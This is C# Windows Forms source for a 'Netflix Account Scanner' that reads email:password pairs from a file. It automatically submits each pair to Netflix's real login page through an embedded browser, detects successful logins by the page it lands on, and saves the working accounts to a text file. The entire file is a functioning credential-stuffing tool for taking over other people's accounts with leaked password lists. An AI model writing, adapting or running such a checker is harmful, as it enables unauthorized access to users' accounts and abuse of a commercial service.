using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net;


namespace NetflixChecker
{
    public partial class Form1 : Form
    {
        bool keepGoing;
        int counter = 0;
        int location = 0;
        string publicsave, username, password, st,pathLocation;
        string[] accounts;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void scanner_Click(object sender, EventArgs e)
        {
            keepGoing = true;
            scanner.Enabled = false;
            button1.Enabled = true;
            timerLogin.Enabled = true;
        }
        private void adder_Click(object sender, EventArgs e)
        {
            try
            {

                string path = string.Empty;
                OpenFileDialog ofd = new OpenFileDialog();
                ofd.ShowDialog();
                path = ofd.FileName;
                pathLocation = ofd.FileName;
                pathLocation = pathLocation.Replace(ofd.SafeFileName, "");
                accounts = File.ReadAllLines(path);
                textBox1.Text = string.Empty;
                foreach (string account in accounts)
                {
                    textBox1.Text += "\n" + account;
                }
                adder.Enabled = false;
                button2.Enabled = true;
            }
            catch (Exception)
            {

            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            textBox1.Clear();
            adder.Enabled = true;
            button2.Enabled = false;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            keepGoing = false;
            scanner.Enabled = true;
            button1.Enabled = false;
            timerLogin.Enabled = false;
            counter = 0;
        }

        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            string newURL = webBrowser1.Url.ToString();
            if (newURL.Contains("ProfilesGate") || newURL.Contains("WiHome"))
            {
                webBrowser1.Navigate("https://www.netflix.com/signout");
                if (!string.IsNullOrEmpty(publicsave))
                {
                    if (!textBox2.Text.Contains(publicsave))
                    {
                        textBox2.Text += Environment.NewLine + publicsave;
                        //Console.WriteLine(publicsave + "   yay");
                    }
                }
                else
                {
                    webBrowser1.Navigate("https://www.netflix.com/login");
                }
            }
            else if (newURL.Contains("logout"))
            {
                webBrowser1.Navigate("https://www.netflix.com/login");
            }
            else if (!newURL.Contains("login"))
            {
                webBrowser1.Navigate("https://www.netflix.com/signout");
            }
        }
        private void login(string username, string password)
        {
            timerLogin.Enabled = false;
            try
            {
                var emailField = webBrowser1.Document.GetElementById("email");
                var passField = webBrowser1.Document.GetElementById("password");
                var button = webBrowser1.Document.GetElementById("login-form-contBtn");
                emailField.Focus();
                emailField.SetAttribute("value", username);
                passField.Focus();
                passField.SetAttribute("value", password);
                button.InvokeMember("click");
                timerLogin.Enabled = true;
            }
            catch (Exception e)
            {
               // MessageBox.Show(e.Message);
                timerLogin.Enabled = true;
            }
        }

        private void timerLogin_Tick(object sender, EventArgs e)
        {
            try
            {
                st = accounts[counter];
                this.Text = "Netflix Account Scanner: " + st;
                counter++;
                if (string.IsNullOrEmpty(st)) return;
                else if (st.Contains('-')) return;
                else if (textBox2.Text.Contains(st)) return;
                else if (!keepGoing) timerLogin.Enabled = false;
                publicsave = st;
                location = st.IndexOf(':');
                username = st.Substring(0, location);
                password = st.Substring(location, st.Length - (location));
                password = password.Replace(':', ' ');
                password = password.Trim();
                login(username, password);
            }
            catch (IndexOutOfRangeException ee)
            {
                if(counter == accounts.Length){
                counter = 0;
                this.Text = "Netflix Account Scanner: " + "Finished!";
                button1.PerformClick();
                MessageBox.Show("it appears we've finished checking your accounts, thanks for using me!");
                timerLogin.Enabled = false;
                File.WriteAllLines(pathLocation + "NetflixChecker.txt",textBox2.Lines);
                MessageBox.Show("Your working accounts are saved in " + pathLocation + "NetflixChecker.txt");
                }
            }
            catch (Exception error)
            {
                //MessageBox.Show(error.Message);
                
            }
        }

        private void webBrowser1_ProgressChanged(object sender, WebBrowserProgressChangedEventArgs e)
        {

        }
    }
}
